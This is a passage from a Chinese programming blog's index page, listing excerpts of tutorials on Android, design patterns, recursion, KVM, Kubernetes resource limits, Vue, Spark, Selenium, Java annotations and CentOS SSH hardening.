&lt;activity android:name=".PersonalInformation"//导入的.java页面 android:exported="true"&gt;//确认导入这个页面 &lt;intent-filter&gt;//这一整段intent-filter代表把这个.java的页面作为主页面 &lt;action android:name="android.intent.action.MAIN" /&gt; &lt;category android:name="android.intent.category.LAUNCHER" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; 把intent-filter剪切到你想要作为主页面的页面即可。
方法二：右键.java文件，运行即可。
方法三：在使用方法二运行过后，直接修改启动选项即可。
app是启动默认界面，其他的是启动指定页面，有叉的是启动失败的界面。右侧的Nexus 4 API 22是启动的模拟器版本，也可以根据需求修改。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82405c19285b63d76ed75a71cafe1319/" rel="bookmark">
			23种设计模式及实现原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、常用23种设计模式原理图
二、何为设计模式，为什么需要
设计模式是一种模式，在面向对象语言中，它运用类与他们的方法来达到目标。开发人员通常回在学习编程语言，并在编写一段时间的代码之后才会考虑设计。或许我们已经注意到，某些人的代码简洁而实用，那么他们究竟是怎么样才能让代码拥有如此的简单之美？设计模式提升了代码的水准，通常会使用更少的类完成目标。模式是思想的体现，而非具体的实现。
三、为什么选择Java
选择Java的一个重要原因在于它是一门面向对象语言，并且骄Java的包容性使得Java语言变得越来越流行，也确保了未来的语言将基于Java进行演变。
四、设计模式的意图
设计模式的意图在于用更为方便的方式表达需求，而这些却是Java体哦那个的常规机制所无法满足的。列如，Java为定义一个接口提供了丰富的支持，以便类能够实现接口。然而，倘若我们能够拥有一个实现了“错误”接口类，却又需要满足客户的需求，就需要运用适配器模式。适配器的模式设计意图是内置于Java语言中的接口所无法满足的。所以我们将设计模式分为以下5类：
接口型模式
职责型模式
构造型模式
操作型模式
扩展型模式
接口型模式：抽象地讲，类的接口是类允许其他类对象访问的方法与字段集。接口通常代表一种承诺，即方法需要实现接口方法名表示的操作，遵循代码注释、测试和其他文档说明。类的实现就是位于方法体中的代码。
Java将接口概念提升为独立的结构，体现了接口（对象必须遵循的承诺）与实现（对象如何履行承诺）的分离。Java接口允许多个类提供相同的功能，也允许一个类同时实现多个类。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d274f06c8b9ccbecce064b31f76f46f/" rel="bookmark">
			对于递归有没有什么好的理解方法？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：帅地
链接：https://www.zhihu.com/question/31412436/answer/683820765
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 可能很多人在大一的时候，就已经接触了递归了，不过，我敢保证很多人初学者刚开始接触递归的时候，是一脸懵逼的，我当初也是，给我的感觉就是，递归太神奇了！
可能也有一大部分人知道递归，也能看的懂递归，但在实际做题过程中，却不知道怎么使用，有时候还容易被递归给搞晕。也有好几个人来问我有没有快速掌握递归的捷径啊。说实话，哪来那么多捷径啊，不过，我还是想写一篇文章，谈谈我的一些经验，或许，能够给你带来一些帮助。
为了兼顾初学者，我会从最简单的题讲起！
递归的三大要素
第一要素：明确你这个函数想要干什么
对于递归，我觉得很重要的一个事就是，这个函数的功能是什么，他要完成什么样的一件事，而这个，是完全由你自己来定义的。也就是说，我们先不管函数里面的代码什么，而是要先明白，你这个函数是要用来干什么。
例如，我定义了一个函数
// 算 n 的阶乘(假设n不为0) int f(int n){ } 这个函数的功能是算 n 的阶乘。好了，我们已经定义了一个函数，并且定义了它的功能是什么，接下来我们看第二要素。
第二要素：寻找递归结束条件
所谓递归，就是会在函数内部代码中，调用这个函数本身，所以，我们必须要找出递归的结束条件，不然的话，会一直调用自己，进入无底洞。也就是说，我们需要找出当参数为啥时，递归结束，之后直接把结果返回，请注意，这个时候我们必须能根据这个参数的值，能够直接知道函数的结果是什么。
例如，上面那个例子，当 n = 1 时，那你应该能够直接知道 f(n) 是啥吧？此时，f(1) = 1。完善我们函数内部的代码，把第二要素加进代码里面，如下
// 算 n 的阶乘(假设n不为0) int f(int n){ if(n == 1){ return 1; } } 有人可能会说，当 n = 2 时，那我们可以直接知道 f(n) 等于多少啊，那我可以把 n = 2 作为递归的结束条件吗？
当然可以，只要你觉得参数是什么时，你能够直接知道函数的结果，那么你就可以把这个参数作为结束的条件，所以下面这段代码也是可以的。
// 算 n 的阶乘(假设n&gt;=2) int f(int n){ if(n == 2){ return 2; } } 注意我代码里面写的注释，假设 n &gt;= 2，因为如果 n = 1时，会被漏掉，当 n &lt;= 2时，f(n) = n，所以为了更加严谨，我们可以写成这样：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d274f06c8b9ccbecce064b31f76f46f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2678171954b63625e370567135e96dc3/" rel="bookmark">
			kvm虚拟化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
简介
KVM部署
环境
CPU虚拟化功能
虚拟机设置
KVM管理界面安装
简介 KVM(Kernel-Based Virtual Machines)是一个基于Linux内核的虚拟化技术, 可以直接将Linux内核转换为Hypervisor（系统管理程序）从而使得Linux内核能够直接管理虚拟机, 直接调用Linux内核中的内存管理、进程管理子系统来管理虚拟机。
KVM部署 环境 系统：CentOS8
IP：192.168.91.134
CPU虚拟化功能 部署前请确保你的CPU虚拟化功能已开启，分为两种情况：
（1）虚拟机要关机设置CPU虚拟化
（2）物理机要在BIOS里开启CPU虚拟化
虚拟机设置 （内存：8G 磁盘：200G 虚拟化功能：开启）
//设置虚拟机内存，添加一块200G的硬盘
//开启虚拟化
//关闭防火墙、selinux [root@kvm ~]# systemctl stop firewalld.service [root@kvm ~]# systemctl disable firewalld.service [root@kvm ~]# sed -i s/SELINUX=enforcing/SELINUX=disabled/g /etc/selinux/config [root@kvm ~]# reboot //新建分区，将硬盘所有大小都给这个分区 [root@kvm ~]# parted -l Model: VMware, VMware Virtual S (scsi) Disk /dev/sda: 322GB Sector size (logical/physical): 512B/512B Partition Table: msdos Disk Flags: Number Start End Size Type File system Flags 1 1049kB 1075MB 1074MB primary xfs boot 2 1075MB 322GB 321GB primary lvm Error: /dev/sdb: unrecognised disk label //这里的错误是因为你还没有进行那种分区 Model: VMware, VMware Virtual S (scsi) Disk /dev/sdb: 215GB Sector size (logical/physical): 512B/512B Partition Table: unknown Disk Flags: [root@kvm ~]# parted /dev/sdb GNU Parted 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2678171954b63625e370567135e96dc3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b67fa8bf0afbb638073dbec5e0602ea/" rel="bookmark">
			VScode 常用插件汇总『附带使用方法』
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VScode 常用插件汇总(持续更新) Chinese (Simplified) (简体中文) 翻译成中文
Easy LESS 编写less文件后自动生成css或者wxss文件。
使用方法：在settings.json文件中添加如下配置信息。
// Easy LESS配置 "less.compile": { "compress": false,//是否压缩 "sourceMap": false,//是否生成map文件，有了这个可以在调试台看到less行数 "out": true, // 是否输出css文件，false为不输出，千万不要是false "outExt": ".wxss", // 输出文件的后缀,小程序可以写'.wxss' // "outExt": ".css", // 输出文件的后缀,小程序可以写'.css' } Turbo Console Log 快捷添加 console.log，一键 注释 / 启用 / 删除 所有 console.log。这也是我最常用的一个插件
ctrl + alt + l 选中变量之后，使用这个快捷键生成 console.log
alt + shift + c (Windows) or option + shift + c (Mac) 注释所有 console.log
alt + shift + u (Windows) or option + shift + u (Mac) 启用所有 console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b67fa8bf0afbb638073dbec5e0602ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b447d3efa336613ed3ad87df7ccfd4d/" rel="bookmark">
			卷积神经网络识别cifar10
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cifar10数据集描述：
提供5万张32* 32像素点的十分类彩色图片和标签，用于训练。
提供1万张的32* 32像素点的十分类彩色图片和标签，用于测试。
10 个类别的RGB彩色图片分别为：飞机（ airlane ）、汽车（ automobile ）、鸟类（ bird ）、猫（ cat ）、鹿（ deer ）、狗（ dog ）、蛙类（ frog ）、马（ horse ）、船（ ship ）和卡车（ truck ）。cifar10数据集查看
代码如下： import tensorflow as tf import matplotlib.pyplot as plt from tensorflow.keras.datasets import cifar10 import numpy as np np.set_printoptions(threshold=np.inf) # 设置Print输出可以无限 # 启用gpu加速 gpus = tf.config.list_physical_devices("GPU") print(gpus) if gpus: gpu0 = gpus[0] # 如果有多个GPU，仅使用第0个GPU tf.config.experimental.set_memory_growth(gpu0, True) # 设置GPU显存用量按需使用 tf.config.set_visible_devices([gpu0], "GPU") # 加载cifar数据 (x_train, y_train), (x_test, y_test) = cifar10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b447d3efa336613ed3ad87df7ccfd4d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19f733f860c4d43045d366dcd67898b4/" rel="bookmark">
			Ubuntu20.04安装与优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一. 安装
二. 系统优化
1. 设置root密码
2. 跟换国内源 3. 安装VMware Tools
4. 关闭自动锁屏
5. 安装ssh
6. 允许root连接ssh
7. 如何保存只读文件
一. 安装 1. 下载iso镜像
镜像下载地址
Ubuntu 20.04.5 LTS (Focal Fossa)
2. 开始安装
参看这篇，照着做不会出错！
Ubuntu20.04桌面版图文安装（超详细）
内存建议2G或者3G硬盘建议给大一点如200G，这里的200G不是说给了200G就会占你200G，是指系统可以用的最大的容量是这么多。你用了多少还是算多少。如果是按照它默认给的20G，你过几月它就会提示空间不足了~ 二. 系统优化 1. 设置root密码 新安装的系统都是没有root密码的，那么需要给它设置一个，设置之后才有的
sudo passwd root 修改好后就能用root进行登录了
2. 跟换国内源 1. 配置
系统安装好后默认的是国外的源，下载东西贼慢，我们要换成国内的，我这里是换的阿里源
建议图形界面操作，参考-》https://www.jb51.net/article/187442.htm
2. 测试更新源 apt-get update
3. 升级系统上的软件包，不然apt-get下载东西的时候会说找不到软件包
apt-get update 用来更新索引源，也就是同步软件包的索引信息，可以理解为更新系统软件的下载地址。 apt-get upgrade 用来升级系统上的软件包。 3. 安装VMware Tools 好像默认是安装好了！此时再来安装东西速度就特别快，不换源的话你就慢慢等吧。
sudo apt upgrate #若升级了就不用升级了 sudo apt install open-vm-tools-desktop -y sudo reboot 此时就能粘贴，移动东西了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19f733f860c4d43045d366dcd67898b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d194dd60ba3c7c253a5348d45bb747e/" rel="bookmark">
			vue封装弹窗组件,父组件控制显示隐藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1 子组件child，dialogVisible控制弹框显示隐藏
&lt;el-dialog title="提示" :visible.sync="dialogVisible" width="30%" :before-close="handleClose"&gt; &lt;span&gt;这是一段信息&lt;/span&gt; &lt;span slot="footer" class="dialog-footer"&gt; &lt;el-button @click="changeShow"&gt;取 消&lt;/el-button&gt; &lt;el-button type="primary" @click="changeShow"&gt;确 定&lt;/el-button&gt; &lt;/span&gt; &lt;/el-dialog&gt; changeShow(){ this.dialogVisible = !this.dialogVisible } 2 父组件parent引入子组件child，在子组件定义ref， 使用ref可以调用子组件的值和方法
&lt;el-button @click="layerShow"&gt;&lt;/el-button&gt; &lt;child ref="child" /&gt; layerShow(){ this.$refs.child.changeShow() } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd4913251cfbea4fd5ee2676cffcf1e3/" rel="bookmark">
			windows安装spark3.2，并使用pycharm测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、windows安装spark 1.1 安装spark spark 3.2.2 下载地址
直接下载解压至需要的文件夹，添加 SPARK_HOME 变量，并在 PATH 变量中添加bin路径
执行spark-shell,进入spark环境命令行即证明安装成功。
如果报错，可参照下文，安装scala与Hadoop。
1.2 安装scala 上文下载的spark要求scala版本为2.13，所以这里下载2.13版本的，我选择的是最新的2.13.5，因为上文中，spark启动时提示的scala版本是这个。
scala 下载地址
点击进入下载界面后，Windows可下载zip格式包或msi格式包。建议下载zip格式包，它体积小，下载快。
ZIP包下载完成后，解压至需要的文件夹，并配置环境变量，添加 SCALA_HOME 变量，并在 PATH 变量中添加bin路径
完成这些后，命令行输入 scala，出现scala命令行即证明安装成功。
1.3 安装hadoop 1.3.1 下载hadoop spark是基于hadoop的，所以spark正常运行需要配置hadoop环境。上文下载的spark要求hadoop版本为3.2，所以这里下载3.2版本的hadoop，hadoop下载地址
这里下载的hadoop版本为3.2.2，与spark版本保持一致.因为Hadoop运行环境是linux，windows需要winutils.exe工具来实现Windows下运行Hadoop。这个工具不支持最新的版本。
1.3.2 hadoop解压缩 使用管理员身份进入cmd，注意不是powershell。这里不能直接解压，否则会报错，解压失败。必须使用管理员身份解压。
进入下载的Hadoop压缩包所在的文件夹，输入 start winrar x -y hadoop-3.2.2.tar.gz 进行解压。
解压完成后，将文件移动至需要的文件夹，这里需要注意，文件路径不能有空格
1.3.3 下载winutils工具 下载地址cdarlint/winutils
直接zip包下载。下载完成后，进入对应Hadoop版本中，这里是3.2.2，将bin目录下的文件拷贝一份放到Hadoop的bin目录下。同时，将 hadoop.dll 文件 拷贝一份放到 C:\Windows\System32 目录下。
1.3.4 配置环境变量 配置 HADOOP_HOME环境变量，并在PATH环境变量中添加Hadoop的bin目录。
1.3.5 Hadoop基础配置 在 hadoop 目录下新建 data 文件夹和 tmp 文件夹。这里的hadoop 目录指解压缩后的Hadoop文件夹目录，也就是上文中的HADOOP_HOME环境变量。
在新建的 data 文件夹下新建 datanode 、namenode 文件夹。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd4913251cfbea4fd5ee2676cffcf1e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac83edfdbf7fa2aaf6144ac6531dd183/" rel="bookmark">
			CentOS 7.9安全漏洞修复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 CVE-2008-5161和SSH弱密钥交换算法 漏洞描述 SSH服务器配置为支持CBC (Cipher Block chain)加密。这可能允许攻击者从密文中恢复明文消息。
漏洞修复 打开ssh的配置文件，增加如下内容：
Ciphers aes256-ctr KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256 MACs hmac-sha2-512-etm@openssh.com,hmac-ripemd160-etm@openssh.com 完成后如下图所示，重启SSH服务以应用配置：
CVE-1999-0524 漏洞描述 远程主机应答 ICMP 时间戳请求。这使得攻击者能够知道在目标计算机上设置的日期，这可能有助于未经身份验证的远程攻击者破坏基于时间的身份验证协议。
从运行 Windows Vista / 7 / 2008 / 2008 R2 的计算机返回的时间戳是故意不正确的，但通常在实际系统时间的 1000 秒内。
漏洞修复 在终端中执行如下命令：
firewall-cmd --permanent --zone=public --add-icmp-block=timestamp-reply firewall-cmd --permanent --zone=public --add-icmp-block=timestamp-request firewall-cmd --reload 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/495511c19c4bc2f640da548ec96777e3/" rel="bookmark">
			Makefile编译arm架构常识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 、arm-linux-gnueabihf-gcc 编译文件
要编译出在 ARM 开发板上运行的可执行文件，需要使用到交叉编译器 arm-linux-gnueabihf-gcc 来编译，在终端中输入如下命令：
arm-linux-gnueabihf-gcc -g -c led.s -o led.o 上述命令就是将 led.s 编译为 led.o，其中“-g”选项是产生调试信息，GDB 能够使用这些
调试信息进行代码调试。“-c”选项是编译源文件，但是不链接。“-o”选项是指定编译产生的文
件名字，这里我们指定 led.s 编译完成以后的文件名字为 led.o。执行上述命令以后就会编译生
成一个 led.o 文件
2 、arm-linux-gnueabihf-ld 链接文件
arm-linux-gnueabihf-ld 用来将众多的.o 文件链接到一个指定的链接位置。我们在学习
SMT32 的时候基本就没有听过“链接”这个词，我们一般用 MDK 编写好代码，然后点击“编
译”，MDK 或者 IAR 就会自动帮我们编译好整个工程，最后再点击“下载”就可以将代码下载
到开发板中。这是因为链接这个操作 MDK 或者 IAR 已经帮你做好了，因此我们现在需要做的就是确定一下本试验最终的可执行文件其运行起始地址，也就是链接地址。这里我们要区分“存储地址”和“运行地址”这两个概念，“存储地址”就是可执行文件存储在哪里，可执行文件的存储地址可以随意选择。“运行地址”就是代码运行的时候所处的地址，这个我们在链接的时候就已经确定好了，代码要运行，那就必须处于运行地址处，否则代码肯定运行出错。比如设备支持 SD 卡、EMMC、NAND 启动，因此代码可以存储到 SD 卡、EMMC 或者 NAND 中，但是要运行的话就必须将代码从 SD 卡、EMMC 或者NAND 中拷贝到其运行地址(链接地址)处，“存储地址”和“运行地址”可以一样，比如STM32 的存储起始地址和运行起始地址都是 0X08000000，输入如下命令
arm-linux-gnueabihf-ld -Ttext 0X87800000 led.o -o led.elf 上述命令中-Ttext 就是指定链接地址，“-o”选项指定链接生成的 elf 文件名，这里我们命名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/495511c19c4bc2f640da548ec96777e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7dd293520616f133b5ae76b5018081a/" rel="bookmark">
			Ubuntu开机默认进入命令行模式/用户图形界面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景： 我有一台2012年买的ThinkPad S430，这台电脑距今已经11年了，最近给它装了Ubuntu，因为听说Linux系统对硬件资源的消耗比较低，但是装上Ubuntu系统之后，电脑的风扇呼呼在响，也比较卡。在网上查了一下，由于Ubuntu的X-Window没有关闭，消耗资源依旧会很大，于是便想要在Ubuntu启动的时候，直接进入命令行模式。
关闭X-Window方法： 在Ubuntu桌面模式下，打开终端(Ctrl+Alt+T)，输入以下命令：
sudo systemctl set-default multi-user.target 执行完成后，重启电脑：
reboot 在命令行模式下，输入命令：
startx 可以进入图形界面
开机默认进入图形用户界面 在Ubuntu桌面模式下，打开终端(Ctrl+Alt+T)，输入以下命令：
sudo systemctl set-default graphical.target 执行完成后，重启电脑：
reboot 在图形模式下，输入Ctrl+Alt+F2可以进入命令行模式
从命令行模式切换到图形界面，输入命令Ctrl+Alt+F7
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5fff6250444487e26e0d88ec4c4ea79/" rel="bookmark">
			k8s资源限制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 容器资源需求和限制Pod服务质量类别LimitRangeResourceQuota 在Kubernetes中可以从容器、Pod和名称空间级别来实现资源限制
容器资源需求和限制 在Pod内的容器上可以对cpu和内存资源定义需求和限制，主要通过pod.spec.containers.resources.requests和pod.spec.containers.resources.limits两个字段实现：
pod.spec.containers.resources.requests：用来定义容器资源需求，表明系统需要预留给该容器使用的资源的最小可用值pod.spec.containers.resources.limits：用来定义资源限制，指定了该容器可以申请使用的资源的最大值，资源限制需要大于等于资源需求 资源需求会影响Pod调度结果，如果一个节点的可用资源小于一个Pod内所有容器的资源需求的和，那么这个Pod不会被调度到这个节点上。资源限制并不影响Pod的调度结果，即一个节点上所有Pod对象资源限制数量之和可以大于节点拥有的资源量，即支持资源过载使用。不过，一旦内存资源耗尽，几乎必然的会有容器因OOMKilled而终止
配置容器的cpu和内存限制可以参考官方文档：https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/assign-memory-resource/和https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/assign-cpu-resource/
下面是一个示例：
kind: Deployment metadata: name: pod-with-requests-limits spec: replicas: 1 selector: matchLabels: app: stress-ng template: metadata: labels: app: stress-ng spec: containers: - name: stress-ng image: lorel/docker-stress-ng imagePullPolicy: IfNotPresent args: ["--vm", "3", "--vm-bytes", "256M"] resources: requests:	#设置容器的资源需求 cpu: 500m	#最少需要0.5个cpu，1cpu=1000m memory: 256Mi	#最少需要256MB内存 limits:	#设置容器的资源限制 cpu: 1	#最多可以使用1个cpu memory: 512Mi	#最多可以有使用512MB内存 查看Pod的资源利用率，cpu和内存的使用量是不会超过limits限制的
如果Pod内容器的资源需求之和超过节点的可用资源，Pod是无法被调度成功的，例如将容器的内存需求修改为100G，再进行创建，Pod会调度失败：
kubectl describe可以看到Pod调度失败
对于压缩性资源CPU来说，若未定义容器的资源需求量，在资源紧缺的情况下，该Pod占用的CPU资源可能会被压缩至极低的水平，甚至导致Pod无法运行。对于非压缩性资源内存来说，在资源紧缺的情况下可能会导致相关业务容器被杀死。所以，对于运行关键业务的Pod，建议一定要使用requests指定资源需求，或者为Pod定义高优先级避免这种情况。
另外，k8s仅确保Pod可以获得它请求的cpu时间额度，它能否获得额外的cpu时间额度，则取决与其它正在运行作业的cpu资源占用情况。例如对于总数1000m的cpu资源来说，容器A请求使用200m，容器b请求使用500m，在不超出它们最大限额的情况下，剩余的的300m会在双方都需要时以2:5(200m:500m)的比例进行分配。
Pod服务质量类别 容器的limits可以大于requests，这表节点资源可以被Pod过载使用，那么在内存资源紧张时，应该以什么顺序终结哪些Pod就成为一个问题。k8s借助Pod的服务质量类别和Pod优先级完成判定。k8s根据Pod内容器的requests和limits属性将Pod分为BestEffort、Burstable和Guaranteed三个服务质量类别：
Guaranteed：为Pod中的所有容器设置了cpu和内存的requests和limits属性，且requests和limits属性的值相等。这类Pod具有最高级别服务质量Burstable：至少为一个容器设置了cpu和内存的requests或limits属性，但不满足Guaranteed类别的要求，这类Pod具有中等级别服务质量BestEffort：没有为任何一个容器设置requests和limits属性，这类Pod具有最低的服务质量 一旦内存资源紧张，BestEffort类别的Pod首先被终止，因为系统不为其提供任何级别的资源保证，但相应的这类Pod可以尽量占用更多的资源。如果此时已经没有BestEffort类别的Pod，接下来会接着终止Burstable类别的Pod。Guaranteed类别的Pod拥有最高优先级，它们不会被杀死，除非其内存资源超过限制，或者没有更低服务质量类别的Pod。
每个运行状态的Pod都有其OOM评分，评分越高越优先被杀死。OOM评分主要根据两个维度进行计算：从服务质量类别继承的默认分值和容器的可用内存资源比例。同等类别的Pod对象的默认分值相同，Guaranteed类别Pod的默认分值为-998，BestEffort类别Pod的默认分值为1000，Burstable类别未定义默认分值，其OOM分值会通过相应的算法计算得出。
因此，同等级别的Pod资源，在内存资源紧缺别终止时，与自身的requests属性相比，内存占用比例最大的Pod会优先被杀死。例如：同属于Burstable类别，PodA内存使用比例为%95，PodB内存占用比例为%80，此时PodA会被终止
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5fff6250444487e26e0d88ec4c4ea79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07e2ee25dddaa6121285427138f5f1da/" rel="bookmark">
			Vue字典配置_全局字典数据获取、快速转义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 一、需求说明
在很多的数据列表中，经常有些字典后端会一个特定的数值或字符串，让你通过某个接口去获取数据，进行转义。
如现在有一个数据列表，要显示字段**姓名、部门名称、状态文本**，而后端的接口只返回了**姓名、部门ID，状态值**。
**后端返回数据格式**
```json
[
{
name: "张三",
deptId: 1,
status: 0
},
{
name: "李四",
deptId: 2,
status: 1
}
]
```
其中部门名称需要通过部门列表接口获取部门列表数据，再从部门列表中找到与部门ID匹配的部门名称
**部门列表数据**
```json
[
{
id: 1,
name: "信息部"
},
{
id: 2,
name: "人力资源部"
}
]
```
状态文本需要通过状态结果字典进行翻译。
**状态结果字典**
```json
[
{
label: "启用",
value: 0
},
{
label: "禁用",
value: 1
}
]
```
# 二、解决方案
1. 安装字典管理插件
```
npm i vue-easy-dict@1.2.0 --save
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07e2ee25dddaa6121285427138f5f1da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58935d493cff71ac3cfa4ecb3f1b2434/" rel="bookmark">
			selenium&#43;python处理JS弹窗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JS弹框出现在页面主要分为3种，第一种是Alert警告弹框，该弹窗只有一个确认按钮；第二种是Confirm确认框，该弹窗有确认和取消按钮；第三种是Prompt确认框，该弹窗可以输入内容。selenium处理JS弹框核心操作步骤就是要先切换到弹窗：alert =driver.switch_to.alert。其中常用的方法有：alert.accept()接收警告信息或点击确认按钮；alert.dismiss()忽略警告信息或点击取消按钮；alert.text获取弹框中的文字信息；alert.send_keys()在弹框中输入信息等。
1、Alert警告弹框，selenium+python示例代码如下：
import time from selenium import webdriver # 实例化浏览器，访问目标网页，窗口最大化 driver=webdriver.Chrome() driver.get("https://www.runoob.com/try/try.php?filename=tryjs_alert") driver.maximize_window() # 切换到iframe driver.switch_to.frame("iframeResult") # 点击弹出弹窗,停留2秒 Ariver.find_element_by_xpath("//input[@type='button']").click() time.sleep(2) # 切换到Alert弹窗 Alert = driver.switch_to.alert # 点击确定按钮，停留2秒 alert.accept() time.sleep(2) # 关闭浏览器 driver.quit() 2、Confirm确认框，selenium+python示例代码如下：
import time from selenium import webdriver # 实例化浏览器，访问目标网页，窗口最大化 driver = webdriver.Chrome() driver.get("https://www.runoob.com/try/try.php?filename=tryjs_confirm") driver.maximize_window() # 切换到iframe,停留2秒 driver.switch_to.frame("iframeResult") time.sleep(2) # 点击弹出Confirm确认框,停留1秒 driver.find_element_by_xpath("//button[text()='点我']").click() time.sleep(1) # 切换到Confirm确认框 Alert = driver.switch_to.alert time.sleep(1) # 点击确认框内的取消按钮 Alert.dismiss() time.sleep(1) # 关闭浏览器 driver.quit() 3、Prompt确认框，selenium+python示例代码如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58935d493cff71ac3cfa4ecb3f1b2434/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e494b9800b19aa37baf18183f0f8e9d7/" rel="bookmark">
			浅谈Java中的自定义注解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中的自定义注解 一、什么是注解？二、自定义注解的语法三、反射注解 一、什么是注解？ An annotation is a form of metadata, that can be added to Java source code. Classes, methods, variables, parameters and packages may be annotated. Annotations have no direct effect on the operation of the code they annotate. 首先以上是官方的描述，
翻译过来的意思就是：注解是一种能被添加到java代码中的元数据，类、方法、变量、参数和包都可以用注解来修饰。注解对于它所修饰的代码并没有直接的影响。
Annontation是Java5开始引入的新特征，中文名称叫注解。
注解是一种元数据形式。即注解是属于java的一种数据类型，和类、接口、数组、枚举类似。
它提供了一种安全的类似注释的机制，用来将任何的信息或元数据（metadata）与程序元素（类、方法、成员变量等）进行关联。为程序的元素（类、方法、成员变量）加上更直观、更明了的说明，这些说明信息是与程序的业务逻辑无关，并且供指定的工具或框架使用。Annontation像一种修饰符一样，应用于包、类型、构造方法、方法、成员变量、参数及本地变量的声明语句中。
Java注解是附加在代码中的一些元信息，主要用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。
二、自定义注解的语法 新建一个自定义注解
当我们使用的时候直接@加上注解名称即可
自定义注解成员属性
注意后面的圆括号不要写丢；这是一个必要特殊的语法。
这个时候要再使用自定义注解的时候就必须给成员属性赋值，
成员属性默认值；可以自己给定默认值，默认值要与前面的类型相对应。
当我们使用自定义注解的时候可以什么都不用写，系统会自动给我们添加上一句话。把我们的属性赋予一个默认值，但是这句话其实是看不到的。
可以作用在类上，可以作用在成员属性上等，因为我们并没有定义它可以作用到哪里。
三、反射注解 在了解反射注解之前，先来看看什么是元注解，元注解就是为其他注解做注解的，就是注解的注解；元注解有四个：
@Decumented : 指示某一类型的注释通过javadoc和类似的默认工具进行文档化。
@Inherited : 指示注释类型被自动继承。
@Retention : 指示注释类型的注释要保留多久。(注解可以保留多久)
@Target : 指示注释类型所适用的程序元素的种类。(注解适用于什么范围)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e494b9800b19aa37baf18183f0f8e9d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bfa072cdbd2078691154e935ede02d5/" rel="bookmark">
			MyBatis学习：MyBatis的配置文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
